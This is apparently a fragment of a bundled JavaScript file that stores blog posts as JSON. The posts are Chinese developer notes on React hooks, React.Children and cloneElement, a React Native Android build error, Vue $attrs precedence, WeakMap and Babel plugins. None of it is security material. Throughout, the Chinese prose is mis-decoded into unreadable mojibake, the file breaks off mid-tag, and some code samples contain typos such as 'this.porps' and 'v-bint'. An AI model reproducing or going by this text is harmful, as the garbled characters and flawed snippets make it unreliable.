è½½å®Œæ¯•ï¼Œä¼šç«‹åˆ»æ‰§è¡Œè¿™ä¸ªactionï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œ<code>reset</code>ï¼Œç„¶åæ˜¾ç¤ºä¼šå˜ä¸º5ã€‚</li>\\n<li>å› æ­¤ç»„ä»¶åŠ è½½ï¼Œæ˜¾ç¤º5ã€‚</li>\\n</ol>\\n<p><a href=\\"https://codesandbox.io/s/48pn6o407\\">ä»¥ä¸Šä»£ç åœ¨çº¿</a></p>\\n<blockquote>\\n<p>å¯ä»¥æ­é…<code>useContext</code>æ¥ä¼ é€’åˆ°æ·±å±‚å­ç»„ä»¶(ä¼ é€’<code>dispatch</code>)ã€‚</p>\\n</blockquote>\\n<p><a href=\\"https://reactjs.org/docs/hooks-faq.html#how-to-avoid-passing-callbacks-down\\">å®˜ç½‘ä¾‹å­:https://reactjs.org/docs/hooks-faq.html#how-to-avoid-passing-callbacks-down</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-08","timeArr":[2018,10,8,0,0,0,0],"title":"React v16.7 Hooks(3)","uuid":"fc7c450a8aab31c939be77ef556ba927f8da6619","summary":"<p>useReducer</p>\\n<p>æ¨¡æ‹Ÿreducer</p>\\n<p><code>const [state, dispatch] = useReducer(reducer, initialState, initialAction);</code></p>\\n<ul>\\n<li>å‚æ•°1<code>reducer</code></li>\\n</ul>\\n<p>ä¸<code>redux</code>å†™æ³•ç›¸æ¯”ï¼Œä¸éœ€è¦é»˜è®¤è¿”å›å€¼</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">red</span>...</span></code></pre>","slug":"React-v16.7-Hooks(3)","sha":"012abf1ae3a9d2bef888109e1147dae1407eda09"}')},568:function(n){n.exports=JSON.parse('{"content":"<p><code>React.Children</code>å’Œ<code>this.props.children</code>éƒ½æ˜¯è·å–çˆ¶ç»„ä»¶çš„å­å…ƒç´ (å­ç»„ä»¶)</p>\\n<p>this.props.children:</p>\\n<ol>\\n<li>1ä¸ªå­å…ƒç´   =&gt; {Object}(Reactå…ƒç´ (ç»„ä»¶)å¯¹è±¡)</li>\\n<li>å¤šä¸ªå­å…ƒç´  =&gt; [{Object},{Object}...]</li>\\n<li>æ— å­å…ƒç´    =&gt; undefined</li>\\n<li>textå…ƒç´    =&gt; text(å­—ç¬¦ä¸²)</li>\\n<li>æ³¨é‡Š       =&gt; undefined</li>\\n</ol>\\n<p>11-21è¡¥å……ï¼š</p>\\n<p><code>this.props.children</code>å¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œå½“ç»„ä»¶æ›´æ–°æ—¶ï¼Œå¹¶ä¸ä¼šé‡å¤æ¸²æŸ“ã€‚</p>\\n<p>æ­é…<code>React.createContext</code>èƒ½è¾¾åˆ°åªæ¸²æŸ“<code>context</code>æ”¹å˜çš„ç»„ä»¶ï¼Œç±»ä¼¼<code>react-redux</code>çš„æ•ˆæœã€‚</p>\\n<p>å‚è€ƒè‡ªï¼š<a href=\\"https://zhuanlan.zhihu.com/p/50336226\\">é¿å…React Contextå¯¼è‡´çš„é‡å¤æ¸²æŸ“</a></p>\\n<p>React.Children:</p>\\n<p>ä¸€ä¸ªæ–¹æ³•é›†åˆ</p>\\n<p>åŒ…å«<code>map,forEach,count,toArray,only</code></p>\\n<ul>\\n<li><p><code>count(children)</code>:è®¡ç®—å­ç»„ä»¶æ•°é‡(æ— å°±ä¸º0)</p>\\n</li>\\n<li><p><code>only(children)</code>:childrenå¿…é¡»æ˜¯å”¯ä¸€ä¸€ä¸ªReactå…ƒç´ å¯¹è±¡(ä¸å¯ä»¥æ˜¯text)</p>\\n</li>\\n</ul>\\n<p>å…¶ä»–å’ŒES6ä¸€æ ·äº†</p>\\n<p>å…¶ä¸­<code>map</code>å’Œ<code>forEach</code>ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ˜¯childrenï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯è‡ªå®šä¹‰å‡½æ•°<code>(child,index)=&gt;{}</code></p>\\n<p>æ— è®ºå‡ ä¸ªå­å…ƒç´ ï¼Œä½¿ç”¨ä¸Šé¢çš„<code>map</code>å’Œ<code>toArray</code>éƒ½ä¼šè¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«ç€{Object}</p>\\n<p>è¿™æ ·æ¥è¿›è¡Œå¤„ç†å°±ä¸éœ€è¦å†å»åˆ¤æ–­ï¼Œæ–¹ä¾¿å®‰å…¨</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-10","timeArr":[2018,5,10,0,0,0,0],"title":"React.Children","uuid":"07cc2d304f96574c9995198fe6ff05e9fc342322","summary":"<p><code>React.Children</code>å’Œ<code>this.props.children</code>éƒ½æ˜¯è·å–çˆ¶ç»„ä»¶çš„å­å…ƒç´ (å­ç»„ä»¶)</p>\\n<p>this.props.children:</p>\\n<ol>\\n<li>1ä¸ªå­å…ƒç´   =&gt; {Object}(Reactå…ƒç´ (ç»„ä»¶)å¯¹è±¡)</li>\\n<li>å¤šä¸ªå­å…ƒç´  =&gt; [{Object},{Object}...]</li>\\n<li>æ— å­å…ƒç´    =...</li>\\n</ol>","slug":"React.Children","sha":"30a4f1281825a6b1c904adf8abddc4b886ccbd1a"}')},569:function(n){n.exports=JSON.parse('{"content":"<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>React.cloneElement(\\n  element,\\n  [props],\\n  [...children]\\n)</code></pre></code></pre>\\n<h2 id=\\"di-yi-ge-can-shu-element\\">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šelement</h2>\\n<p>å¿…é¡»æ˜¯ä¸€ä¸ªå­˜åœ¨çš„Reactç»„ä»¶æˆ–è€…åŸç”ŸDOMï¼Œä»¥ä¸‹éƒ½å¯ä»¥</p>\\n<p><code>React.cloneElement(&lt;div /&gt;)</code>\\n<code>React.cloneElement(&lt;Child /&gt;)</code></p>\\n<p>ä½†æˆ‘ä»¬é€šå¸¸å‘ç°ç”¨çš„æœ€å¤šçš„æ˜¯æ­é…React.Children.mapå’Œthis.props.childrenä½¿ç”¨ï¼Œå¦‚ä¸‹ï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>React.Children.map(<span class=\\"hljs-keyword\\">this</span>.props.children,child=&gt;{\\n    React.cloneElement(child,{...props},children)\\n})</code></pre></code></pre>\\n<p>é¦–å…ˆä¸èƒ½ç›´æ¥å’Œthis.props.childrenä½¿ç”¨ï¼Œä¸€æ—¦å­å…ƒç´ æ•°é‡å¤§äº1ï¼Œtypeä¸ºundefinedçš„Reactå¯¹è±¡</p>\\n<pre><code><pre class=\\"hljs\\"><code>// å­å…ƒç´ æ•°é‡å¤§äº1,è¿”å›ç©º\\nrender(){\\n    return React.cloneElement(this.props.children,...)\\n}</code></pre></code></pre><p>å…¶æ¬¡ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯ä¸ºäº†ç»™å­ç»„ä»¶è¿›è¡Œè‡ªå®šä¹‰å±æ€§é…ç½®ï¼Œè¿™ç”¨åˆ°äº†ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°</p>\\n<h2 id=\\"di-er-ge-can-shu-props\\">ç¬¬äºŒä¸ªå‚æ•°ï¼šprops</h2>\\n<p>é…ç½®å½“å‰elementçš„props</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// æˆ‘ä»¬çš„æ„å›¾æ˜¯å¸Œæœ›æ¯ä¸ªchildç»„ä»¶éƒ½ç»§æ‰¿çˆ¶ç»„ä»¶props</span>\\nReact.Children.map(<span class=\\"hljs-keyword\\">this</span>.props.children,child=&gt;{\\n    React.cloneElement(child,<span class=\\"hljs-keyword\\">this</span>.props)\\n})</code></pre></code></pre>\\n<p>ä½†ä¸Šé¢çš„å†™æ³•ä¸€æ—¦é‡åˆ°åµŒå¥—ç»„ä»¶ï¼Œåˆ™ä¼šè§¦å‘<code>maximum call stack size is exceeded</code>ï¼Œå› ä¸º\\n<code>this.props</code>åŒ…å«äº†<code>children</code>å±æ€§ï¼Œå› æ­¤å°†ä¸€ç›´è¿­ä»£æ‰§è¡Œ.</p>\\n<p>è¿™ä¹ˆå†™èƒ½å®‰å…¨çš„ç»§æ‰¿çˆ¶ç»„ä»¶props</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> {children,...otherPorps}=<span class=\\"hljs-keyword\\">this</span>.porps\\nReact.Children.map(children,child=&gt;{\\n    React.cloneElement(child,otherPorps)\\n})</code></pre></code></pre>\\n<p>å½“ç„¶ï¼Œpropså‚æ•°è¿˜å¯ä»¥è‡ªè¡Œé…ç½®æ–°çš„å±æ€§ï¼Œæœ€ç»ˆéƒ½èƒ½åˆ†åˆ«ä¼ é€’ç»™æ¯ä¸€ä¸ªå­ç»„ä»¶</p>\\n<h2 id=\\"di-san-ge-can-shu-children\\">ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šchildren</h2>\\n<p>é…ç½®å½“å‰elementçš„childrenï¼Œç”¨çš„é¢‘ç‡æ¯”èµ·ç¬¬äºŒä¸ªå‚æ•°ç›¸å¯¹è¾ƒå°‘</p>\\n<p>å’Œç¬¬äºŒä¸ªå‚æ•°ä¸€æ ·ï¼Œè¿™é‡Œä¹Ÿä¸èƒ½ä½¿ç”¨this.props.childrenï¼Œå¦åˆ™ä¹Ÿå°†è¿›å…¥æ­»å¾ªç¯</p>\\n","toc":[{"anchor":"di-yi-ge-can-shu-element","level":2,"text":"ç¬¬ä¸€ä¸ªå‚æ•°ï¼šelement"},{"anchor":"di-er-ge-can-shu-props","level":2,"text":"ç¬¬äºŒä¸ªå‚æ•°ï¼šprops"},{"anchor":"di-san-ge-can-shu-children","level":2,"text":"ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šchildren"}],"relatedTags":null,"created_at":"2018-06-11","timeArr":[2018,5,11,0,0,0,0],"title":"React.cloneElement","uuid":"9fc02f51e144eb4dc14889a72398e5a21ee05145","summary":"<pre class=\\"hljs\\"><code>React.cloneElement(\\n  element,\\n  [props],\\n  [...children]\\n)\\n</code></pre>\\n<h4>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šelement</h4>\\n<p>å¿…é¡»æ˜¯ä¸€ä¸ªå­˜åœ¨çš„Reactç»„ä»¶æˆ–è€…åŸç”ŸDOMï¼Œä»¥ä¸‹éƒ½å¯ä»¥</p>\\n<p><code>React.cloneElement(&lt;div /&gt;)</code>\\n`React.clon...</p>","slug":"React.cloneElement","sha":"f758381282764ccf2eeb5e222145b6ab40de7d78"}')},570:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"react-native-yun-xing-an-zhuo-bao-chu-duplicate-class-wen-ti\\">React Nativeè¿è¡Œå®‰å“æŠ¥å‡ºDuplicate Classé—®é¢˜</h3>\\n<p>æŠ¥é”™ç°è±¡ï¼š</p>\\n<p>å¯åŠ¨å®‰å“å¼€å‘ä¸­ï¼Œå‡ºç°å¤§é‡Duplicate Classé”™è¯¯æç¤º</p>\\n<p><img src=\\"/article/img/duplicate-class.png\\" alt=\\"\\"></p>\\n<p>åœ¨<code>app/build.gradle</code>ä¸­æ·»åŠ </p>\\n<pre><code><pre class=\\"hljs\\"><code>configurations {\\n    all*.exclude module:\'bcprov-jdk15on\'\\n}</code></pre></code></pre>","toc":[{"anchor":"react-native-yun-xing-an-zhuo-bao-chu-duplicate-class-wen-ti","level":3,"text":"React Nativeè¿è¡Œå®‰å“æŠ¥å‡ºDuplicate Classé—®é¢˜"}],"relatedTags":null,"created_at":"2022-09-29","timeArr":[2022,8,29,0,0,0,0],"title":"ReactNativeå®‰å“æ‰“åŒ…é”™è¯¯ï¼šDuplicate Classé—®é¢˜","uuid":"7d1e02ecc096a476ad4ed88e3354920a21e40f15","summary":"<h4>React Nativeè¿è¡Œå®‰å“æŠ¥å‡ºDuplicate Classé—®é¢˜</h4>\\n<p>æŠ¥é”™ç°è±¡ï¼š</p>\\n<p>å¯åŠ¨å®‰å“å¼€å‘ä¸­ï¼Œå‡ºç°å¤§é‡Duplicate Classé”™è¯¯æç¤º</p>\\n<p><img src=\\"/article/img/duplicate-class.png\\" alt=\\"\\"></p>\\n<p>åœ¨<code>app/build.gradle</code>ä¸­æ·»åŠ </p>\\n<pre class=\\"hljs\\"><code>configurati...</code></pre>","slug":"ReactNative-an-zhuo-da-bao-cuo-wu-ï¼šDuplicate-Class-wen-ti","sha":"af9902397a4428fa893968c40dab1a5c1da7e809"}')},571:function(n){n.exports=JSON.parse('{"content":"<p>å› ä¸ºåœ¨react-nativeä¸­ï¼Œæ‰€æœ‰å®‰å“éƒ½ç›´æ¥è¿”å›<code>&lt;View /&gt;</code></p>\\n<p><a href=\\"https://github.com/facebook/react-native/blob/277a64f03ec2a5a5c833f15263b3c3fa45577cae/Libraries/Components/SafeAreaView/SafeAreaView.js#L29-L34\\">https://github.com/facebook/react-native/blob/277a64f03ec2a5a5c833f15263b3c3fa45577cae/Libraries/Components/SafeAreaView/SafeAreaView.js#L29-L34</a></p>\\n<pre><code><pre class=\\"hljs\\"><code>if (Platform.OS === \'android\') {\\n  exported = View;\\n} else {\\n  exported = require(\'./RCTSafeAreaViewNativeComponent\').default;\\n}\\n</code></pre></code></pre><p>ä½¿ç”¨<code>react-native-safe-area-context</code>è§£å†³é—®é¢˜</p>\\n","toc":[],"relatedTags":null,"created_at":"2022-09-28","timeArr":[2022,8,28,0,0,0,0],"title":"SafeAreaViewåœ¨åä¸ºæœºå‹ä¸èµ·ä½œç”¨","uuid":"50bd8f6626234c3d9241976661b6a78d10859163","summary":"<p>å› ä¸ºåœ¨react-nativeä¸­ï¼Œæ‰€æœ‰å®‰å“éƒ½ç›´æ¥è¿”å›<code>&lt;View /&gt;</code></p>\\n<p>[https://github.com/facebook/react-native/blob/277a64f03ec2a5a5c833f15263b3c3fa45577cae/Libraries/Components/SafeAreaView/...</p>","slug":"SafeAreaView-zai-hua-wei-ji-xing-bu-qi-zuo-yong","sha":"f5189448419dd4c2ab51e65d3a040d41675899ac"}')},572:function(n){n.exports=JSON.parse('{"content":"<p>æœ€å¼€å§‹æˆ‘è®¤ä¸ºå¯ä»¥ç”¨<code>v-bind=&quot;$attrs&quot;</code>æ¥è¦†ç›–<code>v-on:key=&quot;value&quot;</code>çš„ç»‘å®šï¼Œä»¥è‡³äºåœ¨ä½¿ç”¨<code>vuetify</code>åˆ›å»ºè‡ªå®šä¹‰ç»„ä»¶æ—¶é€šè¿‡<code>$attrs</code>æ¥è¦†ç›–propså±æ€§ï¼Œ</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-vue\\"><pre class=\\"hljs\\"><code>&lt;template&gt;\\n    &lt;!-- æœ¬æ„æ˜¯é€šè¿‡$attrsä¼ é€’çš„coloræ¥è¦†ç›–æ‰é»˜è®¤çš„color --&gt;\\n    &lt;v-btn color=&quot;info&quot; v-bint=&quot;$attrs&quot;&gt;\\n        &lt;slot&gt;&lt;/slot&gt;\\n    &lt;/v-btn&gt;\\n&lt;/template&gt;\\n&lt;script&gt;\\n    export default {\\n        name: \'CustomButton\'\\n    }\\n&lt;/script&gt;</code></pre></code></pre>\\n<p>è¿™ä¸ªæ¡ˆä¾‹ç¡®å®æœ‰æ•ˆï¼Œ ä½†å…¶å®<code>v-bind=$attrs</code>å¹¶ä¸èƒ½è¦†ç›–æ‰propsçš„ç»‘å®šï¼Œå‚è€ƒä¸€ä¸‹ä¾‹å­ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>&lt;input placeholder=<span class=\\"hljs-string\\">\\"a\\"</span> v-bind=<span class=\\"hljs-string\\">\\"{placeholder : \'b\'}\\"</span> /&gt;\\n&lt;input v-bind=\\"{placeholder : \'b\'}\\" placeholder=\\"a\\" /&gt;</code></pre></code></pre>\\n<p>åœ¨ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¸ç®¡ä½ çš„<code>v-bind</code>æ”¾åœ¨å‰è¿˜æ˜¯åï¼Œæœ€åplaceholderæ¸²æŸ“å‡ºæ¥éƒ½æ˜¯&quot;a&quot;ã€‚</p>\\n<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œåœ¨<code>vuetify</code>ä¸­ä¸ºä»€ä¹ˆå¯ä»¥ä½¿ç”¨<code>$attrs</code>è¿›è¡Œè¦†ç›–ï¼Ÿ</p>\\n<p>åŸæ¥åœ¨vuetifyå†…éƒ¨ï¼Œæœ‰ä¸€ä¸ªwatchï¼Œå¯¹äºä¼ å…¥çš„$attrsï¼Œ ä¼šé¦–å…ˆç»‘å®šåˆ°<code>vm.$data.attrs$</code>ï¼Œè¿™ä¸ª<code>attrs$</code>æ˜¯è‡ªå®šä¹‰ä¸€ä¸ªç©ºå¯¹è±¡ï¼Œä½œç”¨å°±æ˜¯ä¸ºäº†è·Ÿè¸ª<code>$attrs</code></p>\\n<p>åœ¨æ¸²æŸ“ç»„ä»¶æ—¶ï¼Œå…¶å®å°†$attrså…¨éƒ¨è½¬æ¢ä¸ºäº†propsåœ¨ä¼ é€’å…¥å­ç»„ä»¶</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> data={\\n    <span class=\\"hljs-comment\\">// ä¸€äº›è‡ªå®šä¹‰props</span>\\n    ...this.data.attrs$,\\n}\\n<span class=\\"hljs-keyword\\">return</span> h(<span class=\\"hljs-keyword\\">this</span>.tag, data, newChildren)</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2021-10-03","timeArr":[2021,9,3,0,0,0,0],"title":"Vueä¸­propsç»‘å®šå’Œ$attrsç»‘å®šçš„ä¼˜å…ˆç­‰çº§","uuid":"6798b7d7e1d0be3c2f8889f3f527875e351b867c","summary":"<p>æœ€å¼€å§‹æˆ‘è®¤ä¸ºå¯ä»¥ç”¨<code>v-bind=&quot;$attrs&quot;</code>æ¥è¦†ç›–<code>v-on:key=&quot;value&quot;</code>çš„ç»‘å®šï¼Œä»¥è‡³äºåœ¨ä½¿ç”¨<code>vuetify</code>åˆ›å»ºè‡ªå®šä¹‰ç»„ä»¶æ—¶é€šè¿‡<code>$attrs</code>æ¥è¦†ç›–propså±æ€§ï¼Œ</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre class=\\"hljs\\"><code>&lt;template&gt;\\n    &lt;!-- æœ¬æ„æ˜¯é€šè¿‡$attrsä¼ é€’çš„coloræ¥è¦†ç›–æ‰é»˜è®¤çš„color...</code></pre>","slug":"Vue-zhong-props-bang-ding-he-$attrs-bang-ding-de-you-xian-deng-ji","sha":"e7813bbaeb1fb13c70ce1da35fb282ec842889d2"}')},573:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"weakmap\\">WeakMap</h4>\\n<ul>\\n<li><p>é”®æ˜¯å¼±å¼•ç”¨</p>\\n<p>  å¦‚æœå…¶ä»–å¯¹è±¡éƒ½ä¸å†å¼•ç”¨è¯¥å¯¹è±¡ï¼Œé‚£ä¹ˆåƒåœ¾å›æ”¶æœºåˆ¶ä¼šè‡ªåŠ¨å›æ”¶è¯¥å¯¹è±¡æ‰€å ç”¨çš„å†…å­˜ï¼Œä¸è€ƒè™‘è¯¥å¯¹è±¡æ˜¯å¦è¿˜åœ¨è¯¥å¼±å¼•ç”¨çš„ç»“æ„ä¸­</p>\\n</li>\\n</ul>\\n<p>å› æ­¤ï¼Œé”®ä¸€æ—¦ä¸¢å¤±ï¼Œå†ä¹Ÿæ— æ³•è·å–å†…å®¹</p>\\n<ol>\\n<li>å¿…é¡»ä½¿ç”¨å¯¹è±¡ä½œä¸ºé”®ï¼Œå½“å¯¹è±¡å¼•ç”¨æ¶ˆå¤±ï¼Œè‡ªåŠ¨æ¸…é™¤</li>\\n<li>å¿…é¡»é€šè¿‡é”®å»è·å–å†…å®¹</li>\\n</ol>\\n<p>åªè¦ä¿ç®¡å¥½ key ï¼Œå®ƒå°±æ˜¯çœŸæ­£çš„ç§æœ‰å±æ€§</p>\\n<ul>\\n<li>WeakMapå’ŒSymbol</li>\\n</ul>\\n<p>Symbolå¯ä»¥é€šè¿‡ <code>getOwnPropertySymboly</code>å»è·å–æ‰€æœ‰Symbol</p>\\n<pre><code><pre class=\\"hljs\\"><code>const object1 = {};\\nconst a = Symbol(\'a\');\\n\\nobject1[a] = \'localSymbol\';\\n\\nconst objectSymbols = Object.getOwnPropertySymbols(object1);\\n\\nconsole.log(object1[objectSymbols[0]]);</code></pre></code></pre>","toc":[{"anchor":"weakmap","level":4,"text":"WeakMap"}],"relatedTags":null,"created_at":"2018-11-17","timeArr":[2018,10,17,0,0,0,0],"title":"WeakMapç†è§£ç¬”è®°","uuid":"f559d47fb4cf8cfa9bfb2bd0d9bba58e079f66ec","summary":"<h4>WeakMap</h4>\\n<ul>\\n<li>\\n<p>é”®æ˜¯å¼±å¼•ç”¨</p>\\n<p>å¦‚æœå…¶ä»–å¯¹è±¡éƒ½ä¸å†å¼•ç”¨è¯¥å¯¹è±¡ï¼Œé‚£ä¹ˆåƒåœ¾å›æ”¶æœºåˆ¶ä¼šè‡ªåŠ¨å›æ”¶è¯¥å¯¹è±¡æ‰€å ç”¨çš„å†…å­˜ï¼Œä¸è€ƒè™‘è¯¥å¯¹è±¡æ˜¯å¦è¿˜åœ¨è¯¥å¼±å¼•ç”¨çš„ç»“æ„ä¸­</p>\\n</li>\\n</ul>\\n<p>å› æ­¤ï¼Œé”®ä¸€æ—¦ä¸¢å¤±ï¼Œå†ä¹Ÿæ— æ³•è·å–å†…å®¹</p>\\n<ol>\\n<li>å¿…é¡»ä½¿ç”¨å¯¹è±¡ä½œä¸ºé”®ï¼Œå½“å¯¹è±¡å¼•ç”¨æ¶ˆå¤±ï¼Œè‡ªåŠ¨æ¸…é™¤</li>\\n<li>å¿…é¡»é€šè¿‡é”®å»è·å–å†…å®¹</li>\\n</ol>\\n<p>åªè¦ä¿ç®¡å¥½ key ï¼Œå®ƒå°±æ˜¯...</p>","slug":"WeakMap-li-jie-bi-ji","sha":"200fdba2077d822ff14086c8249fb87383fb32dc"}')},574:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"bable-cha-jian-bian-xie-yi-xie-zong-jie\\">BABLEæ’ä»¶ç¼–å†™ä¸€äº›æ€»ç»“</h2>\\n<ol>\\n<li><p>babel-pluginæ€»æ˜¯å…ˆäºbabel-presetsæ‰§è¡Œï¼Œä½†å®é™…ä¸Šå®ƒä»¬æ˜¯å¹¶è¡Œæ‰§è¡Œï¼Œå› æ­¤å¦‚æœéœ€è¦ç¼–å†™ä¸€ä¸ªæœ‰ä¾èµ–çš„babelæ’ä»¶ï¼Œå…¶å®å°±æ˜¯\\n raceæ¨¡å¼ã€‚<a href=\\"https://jamie.build/babel-plugin-ordering.html\\">https://jamie.build/babel-plugin-ordering.html</a></p>\\n<p> è¿™ä¹ˆåšæ˜¯ä¸ºäº†èŠ‚çœç¼–è¯‘æ—¶é—´ï¼Œæœ‰ä¸€ä¸ªé€‰é¡¹ï¼Œ<code>passPerPreset</code>å¯ä»¥å•çº¿ç¨‹æ‰§è¡Œç¼–è¯‘ï¼Œä½†æ˜¯è¿™ä¼šå½±å“æ€§èƒ½ï¼Œå› æ­¤åç»­å¯èƒ½åºŸå¼ƒã€‚</p>\\n<p> æ¯”è¾ƒå¥½çš„æ–¹æ³•æ˜¯ï¼Œå¦‚æœéœ€è¦æœ€å…ˆè·å–æºä»£ç ASTï¼Œ</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> visitor:{\\n  <span class=\\"hljs-attr\\">Program</span>:{\\n    <span class=\\"hljs-string\\">\\"enter\\"</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">path</span>)</span>{   \\n      path.traverse({\\n        <span class=\\"hljs-comment\\">//...</span>\\n      })\\n    }\\n  }\\n }\\n</code></pre></code></pre>\\n</li>\\n<li><p>å¯¹äº<code>t.XXXXX()</code>ï¼Œæ‹¬å·å†…éƒ¨åªéœ€è¦å¡«å†™éœ€è¦çš„å±æ€§å³å¯</p>\\n</li>\\n<li><p>åœ¨<code>AST</code>æ ‘ä¸­è¦è·å–æŸä¸ªå˜é‡æˆ–è€…å‚æ•°çš„å¼•ç”¨ï¼Œéå¸¸å›°éš¾ï¼Œå› ä¸ºæœ‰å„ç§æƒ…å†µï¼ŒåŒ…æ‹¬</p>\\n<ul>\\n<li><p>å®šä¹‰å˜é‡</p>\\n</li>\\n<li><p>å‚æ•°èµ‹å€¼</p>\\n</li>\\n<li><p>import</p>\\n</li>\\n<li><p>å±æ€§è·å–</p>\\n</li>\\n<li><p>forå¾ªç¯çš„index\\n...</p>\\n<p>ä¸Šè¿°æ‰€æœ‰æƒ…å†µè¿˜èƒ½äº’ç›¸å åŠ ï¼Œè¦å°†æ‰€æœ‰éƒ½è¦†ç›–ï¼Œæ˜¯å¾ˆå¤§çš„å·¥ç¨‹ï¼Œå› æ­¤å°½é‡åªå¯¹å­—é¢å»ä¿®æ”¹ï¼Œä¸è¦è¿½æº¯ã€‚</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>å¦‚æœé¡¹ç›®åŠ¨æ€ç¼–è¯‘çš„æƒ…å†µå¾ˆå¤šï¼Œé‚£ä¹ˆASTé™æ€ç¼–è¯‘æ•ˆæœå¯èƒ½ä¸å¤ªå¥½ã€‚</p>\\n</li>\\n</ol>\\n","toc":[{"anchor":"bable-cha-jian-bian-xie-yi-xie-zong-jie","level":2,"text":"BABLEæ’ä»¶ç¼–å†™ä¸€äº›æ€»ç»“"}],"relatedTags":null,"created_at":"2018-09-24","timeArr":[2018,8,24,0,0,0,0],"title":"babelæ’ä»¶çš„ä¸€äº›æ€»ç»“","uuid":"ca04d014d61ce50791c49363dae3a3d3ae3b1e54","summary":"<h4>BABLEæ’ä»¶ç¼–å†™ä¸€äº›æ€»ç»“</h4>\\n<ol>\\n<li>\\n<p>babel-pluginæ€»æ˜¯å…ˆäºbabel-presetsæ‰§è¡Œï¼Œä½†å®é™…ä¸Šå®ƒä»¬æ˜¯å¹¶è¡Œæ‰§è¡Œï¼Œå› æ­¤å¦‚æœéœ€è¦ç¼–å†™ä¸€ä¸ªæœ‰ä¾èµ–çš„babelæ’ä»¶ï¼Œå…¶å®å°±æ˜¯\\nraceæ¨¡å¼ã€‚https://jamie.build/babel-plugin-ordering.html</p>\\n<p>è¿™ä¹ˆåšæ˜¯ä¸º...</p>\\n</li>\\n</ol>","slug":"babel-cha-jian-de-yi-xie-zong-jie","sha":"35b77bbafb93c7b66d99747c168be81a28ee84aa"}')},575:function(n){n.exports=JSON.parse('{"content":"<p><a href=\\"https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/\\">åŸæ–‡é˜…è¯»</a></p>\\n<p><img src=\\"/article/img/js_obfuscation.png\\" alt=\\"js_obfuscation\\"></p>\\n<p><a href=\\"#%E7%BC%96%E7%A0%81\\">ç¼–ç </a></p>\\n<p><a href=\\"#%E5%8A%A0%E5%AF%86\\">åŠ å¯†</a></p>\\n<p><a href=\\"#%E6%95%A3%E5%88%97%E6%B3%95(%E5%93%88%E5%B8%8C)\\">æ•£åˆ—æ³•</a></p>\\n<p><a href=\\"#%E6%B7%B7%E6%B7%86\\">æ··æ·†</a></p>\\n<p>å¾ˆå¤šäººéƒ½å¯¹ç¼–ç ï¼ŒåŠ å¯†ï¼Œå“ˆå¸Œï¼Œæ··æ·†çš„ä¸åŒç‚¹æ„Ÿåˆ°<a href=\\"http://www.google.com/search?sourceid=chrome&amp;ie=UTF-8&amp;q=what%27s+the+difference+between+encoding+and+encryption%3F\\">ç–‘æƒ‘</a>ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªè§£é‡Šï¼š</p>\\n<h3 id=\\"bian-ma\\">ç¼–ç </h3>\\n<p> <img src=\\"/article/img/ascii-image.png\\" alt=\\"ascii\\"></p>\\n<p>ç¼–ç çš„ç›®çš„æ˜¯å°†æ•°æ®è½¬æ¢ï¼Œä½¿å…¶èƒ½è¢«å„ç±»ä¸åŒçš„ç³»ç»Ÿæ­£ç¡®(å®‰å…¨)çš„è§£æã€‚ä¾‹å¦‚ï¼šemailå‘é€çš„æ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œåœ¨webä¸ŠæŸ¥çœ‹ç‰¹æ®Šå­—ç¬¦ã€‚\\nå®ƒçš„ç›®çš„<em>ä¸æ˜¯</em>ä¸ºäº†è®©æ•°æ®æ›´å®‰å…¨ï¼Œè€Œæ˜¯èƒ½è®©æ•°æ®è¢«æ­£ç¡®çš„è§£æã€‚</p>\\n<p>ç¼–ç é€šè¿‡ä¸€äº›å…¬å¼€å¯ç”¨çš„æ–¹æ¡ˆå°†æ•°æ®è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œå› æ­¤å®ƒæ˜¯å¯é€†çš„ã€‚å¯¹ç¼–ç è¿›è¡Œè§£ç ä¸éœ€è¦å¯†é’¥ï¼Œä»…ä»…éœ€è¦ç”Ÿæˆè¿™ä¸ªç¼–ç çš„ç®—æ³•ã€‚</p>\\n<p>ä¾‹å­ï¼š<a href=\\"http://www.asciitable.com/\\">ASCII</a>, <a href=\\"https://danielmiessler.com/study/encoding/#unicode\\">UNICODE</a>, <a href=\\"http://www.eskimo.com/~bloo/indexdot/html/topics/urlencoding.htm\\">URL ENCODING</a>, <a 